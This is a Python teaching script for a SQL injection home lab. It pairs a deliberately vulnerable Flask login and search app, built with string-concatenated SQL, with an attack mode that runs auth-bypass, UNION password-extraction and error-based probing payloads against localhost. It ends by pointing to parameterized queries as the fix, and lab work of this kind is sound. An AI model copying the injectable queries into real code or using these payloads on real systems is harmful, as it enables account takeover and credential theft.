#!/usr/bin/env python3
"""
PyJection_Payload.py - Single-file SQL Injection Home Lab
Contains BOTH the vulnerable target app and the exploit demo in one script.
For use on localhost / your own isolated lab network ONLY.
Usage:
    python3 PyJection_Payload.py server      # start the vulnerable Flask app
    python3 PyJection_Payload.py attack      # run the exploit demo against it
                                     # (run server in one terminal first,
                                     #  then attack in another)
Requires:
    pip install flask requests
"""
import sys
import sqlite3
TARGET = "http://127.0.0.1:5000"
DB = "Lab.db"
# --------------------------------------------------------------------------
# SERVER MODE: a deliberately vulnerable Flask app
# --------------------------------------------------------------------------
def run_server():
    from flask import Flask, request, render_template_string
    app = Flask(__name__)
    def init_db():
        conn = sqlite3.connect(DB)
        cur = conn.cursor()
        cur.execute("DROP TABLE IF EXISTS users")
        cur.execute("""
            CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT,
                password TEXT,
                role TEXT
            )
        """)
        cur.executemany(
            "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
            [
                ("alice", "alicepass123", "user"),
                ("bob", "bobpass456", "user"),
                ("admin", "S3cretAdminPW!", "admin"),
            ],
        )
        conn.commit()
        conn.close()
    LOGIN_PAGE = """
    <h2>Lab Login (VULNERABLE - for local testing only)</h2>
    <form method="POST">
        Username: <input name="username"><br>
        Password: <input name="password" type="password"><br>
        <input type="submit" value="Login">
    </form>
    {% if message %}<p><b>{{ message|safe }}</b></p>{% endif %}
    <hr>
    <p>Try the username field: <code>' OR '1'='1</code></p>
    """
    @app.route("/", methods=["GET", "POST"])
    def login():
        message = ""
        if request.method == "POST":
            username = request.form.get("username", "")
            password = request.form.get("password", "")
            # --- VULNERABLE: raw string concatenation into SQL ---
            query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
            conn = sqlite3.connect(DB)
            cur = conn.cursor()
            try:
                cur.execute(query)
                row = cur.fetchone()
            except sqlite3.Error as e:
                row = None
                message = f"SQL error: {e}"
            conn.close()
            if row:
                message = f"Logged in as <b>{row[1]}</b> (role: {row[3]})"
            elif not message:
                message = "Login failed."
        return render_template_string(LOGIN_PAGE, message=message)
    @app.route("/search")
    def search():
        """A second vulnerable endpoint: UNION-based injection target."""
        term = request.args.get("q", "")
        query = f"SELECT username, role FROM users WHERE username LIKE '%{term}%'"
        conn = sqlite3.connect(DB)
        cur = conn.cursor()
        try:
            cur.execute(query)
            rows = cur.fetchall()
            result = "<br>".join(f"{u} - {r}" for u, r in rows)
        except sqlite3.Error as e:
            result = f"SQL error: {e}"
        conn.close()
        return (f"<h2>Search results</h2>{result}<hr>"
                "Try: <code>?q=x' UNION SELECT username, password FROM users--</code>")
    init_db()
    print("[*] Lab DB initialized with users: alice, bob, admin")
    print("[*] Starting app on http://127.0.0.1:5000 (localhost only)")
    app.run(host="127.0.0.1", port=5000, debug=False)
# --------------------------------------------------------------------------
# ATTACK MODE: exploit demo against the server above
# --------------------------------------------------------------------------
def run_attack():
    import requests
    if "127.0.0.1" not in TARGET and "localhost" not in TARGET:
        sys.exit("[!] This script only targets localhost by design.")
    try:
        requests.get(TARGET, timeout=2)
    except requests.exceptions.ConnectionError:
        sys.exit(f"[!] Can't reach {TARGET}. Start the server first:\n"
                  f"    python3 PyJection_Payload.py server")
    print(f"[*] Target: {TARGET} (local lab instance)")
    print("\n=== Technique 1: Authentication Bypass ===")
    payload = {"username": "' OR '1'='1' --", "password": "anything"}
    print(f"[*] Sending username payload: {payload['username']}")
    resp = requests.post(TARGET + "/", data=payload)
    if "Logged in as" in resp.text:
        line = [l for l in resp.text.splitlines() if "Logged in as" in l][0]
        print(f"[+] Bypass succeeded -> {line.strip()}")
    else:
        print("[-] Bypass failed.")
    print("\n=== Technique 2: UNION-based Data Extraction ===")
    payload = "x' UNION SELECT username, password FROM users--"
    print(f"[*] Sending search payload: {payload}")
    resp = requests.get(TARGET + "/search", params={"q": payload})
    print("[*] Response snippet:")
    for line in resp.text.split("<br>"):
        if " - " in line:
            print(f"    {line.strip()}")
    print("\n=== Technique 3: Error-Based Probing ===")
    payload = "x' AND 1=CAST((SELECT sqlite_version()) AS INTEGER)--"
    print(f"[*] Sending probe payload: {payload}")
    resp = requests.get(TARGET + "/search", params={"q": payload})
    if "SQL error" in resp.text:
        print("[+] Error message leaked database info:")
        for line in resp.text.splitlines():
            if "SQL error" in line:
                print(f"    {line.strip()}")
    else:
        print("[-] No error returned.")
    print("\n[*] Done. Compare these results to the server() function's SQL above.")
    print("[*] Next step: rewrite the queries to use parameterized placeholders (?)")
    print("    and re-run this attack to confirm it now fails.")


# --------------------------------------------------------------------------

def main():
    if len(sys.argv) != 2 or sys.argv[1] not in ("server", "attack"):
        print(__doc__)
        sys.exit(1)

    if sys.argv[1] == "server":
        run_server()
    else:
        run_attack()
if __name__ == "__main__":
    main()